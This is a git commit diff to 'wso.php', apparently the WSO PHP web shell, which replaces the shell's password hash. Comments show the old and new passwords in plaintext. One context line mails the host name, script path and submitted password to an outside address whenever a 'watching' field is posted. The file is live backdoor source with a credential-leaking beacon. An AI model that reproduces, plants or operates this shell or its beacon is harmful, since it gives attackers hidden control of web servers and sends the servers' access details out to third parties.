095aa7dde8c7eba5f91ee2fc9008f453b76f007d
Bearsec <bearsec@ya.ru>
2024-01-18 18:07:15 +0300

    Update wso.php

--- wso.php
+++ wso.php
@@ -4,7 +4,7 @@ if(array_key_exists('watching',$_POST)){
 	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('test@testmail.com', 'root', $tmp); // Edit or delete!
 }
 //-----------------Password---------------------
-$▛ = "161ebd7d45089b3446ee4e0d86dbcf92"; // P@ssw0rd
+$▛ = "fa769dac7a0a94ee47d8ebe021eaba9e"; // ghost287
 $▘ = true;
 $▜ = 'UTF-8';
 $▚ = 'FilesMan';
